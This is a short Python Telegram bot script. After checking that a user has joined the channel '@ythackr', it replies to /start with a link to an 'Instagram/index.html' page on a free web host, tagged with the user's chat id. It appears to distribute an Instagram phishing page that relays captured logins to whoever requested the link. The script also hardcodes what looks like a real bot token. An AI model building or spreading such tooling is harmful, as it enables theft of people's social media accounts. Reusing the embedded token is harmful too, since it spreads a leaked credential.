
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes


TOKEN = "8433805978:AAGy3wgK5hZ1n3SEB5eXdZH975bvNL95ee8"
CHANNEL_USERNAME = "@ythackr"

# ✅ join check
async def is_joined(user_id, context):
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status not in ["left", "kicked"]
    except:
        return False

# ✅ start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message is None:
        return
        
    user = update.effective_user
    chat_id = user.id

    joined = await is_joined(chat_id, context)

    if not joined:
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            "❌ Pehle channel join karo!",
            reply_markup=reply_markup
        )
        return

    link = f"http://ytboy122.wuaze.com/Instagram/index.html?chatid={chat_id}"

    await update.message.reply_text(
        "Bot by yt_boy122\nUse this link:\n" + link
    )

# ✅ main runner (IMPORTANT)
async def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))

    print("Bot running...")

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    # 🔥 keep alive forever
    while True:
        await asyncio.sleep(1000)

# ▶️ run
if __name__ == "__main__":
    asyncio.run(main())